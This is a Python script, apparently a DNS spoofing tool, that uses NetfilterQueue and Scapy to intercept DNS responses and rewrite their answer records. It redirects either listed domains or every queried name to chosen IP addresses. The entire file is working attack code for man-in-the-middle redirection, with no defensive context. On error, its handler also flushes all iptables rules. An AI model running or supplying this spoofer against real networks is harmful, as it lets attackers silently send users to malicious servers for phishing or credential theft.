from netfilterqueue import NetfilterQueue
import socket
from scapy.all import *
import sys
import os
ip = None

# Hosts config
hosts = {
    b"site.com." : "192.168.1.1",
    b"www.site.com." : "192.168.1.3"
}



def packmain(pack):
    scpack = IP(pack.get_payload())

    if scpack.haslayer(DNSRR):
        print("[After] -> ", scpack.summary())
        scpack = editdnspack(scpack)
        print("[Before]-> ", scpack.summary())


        pack.set_payload(bytes(scpack))

    pack.accept()


def allpackmain(pack):
    scpack = IP(pack.get_payload())

    if scpack.haslayer(DNSRR):
        print("[After] -> ", scpack.summary())
        scpack = editalldnspack(scpack)
        print("[Before]-> ", scpack.summary())


        pack.set_payload(bytes(scpack))

    pack.accept()


def editalldnspack(pack):
    qname = pack[DNSQR].qname

    pack[DNS].an = DNSRR(rrname=qname, rdata=ip)
    pack[DNS].ancount = 1

    del pack[IP].len
    del pack[IP].chksum
    del pack[UDP].len
    del pack[UDP].chksum

    return pack


def editdnspack(pack):
    qname = pack[DNSQR].qname

    if qname in hosts:
        pack[DNS].an = DNSRR(rrname=qname, rdata=hosts[qname])
        pack[DNS].ancount = 1

        del pack[IP].len
        del pack[IP].chksum
        del pack[UDP].len
        del pack[UDP].chksum

    return pack




def start(ips = False):
    global ip
    ip = ips
    if ips:
        que = NetfilterQueue()

        try:
            que.bind(0, allpackmain)
            que.run()

        except:
            os.system("iptables --flush")
            que.unbind()
            sys.exit()

        que.unbind()

    else:
        que = NetfilterQueue()

        que.bind(0, packmain)
        que.run()

        que.unbind()
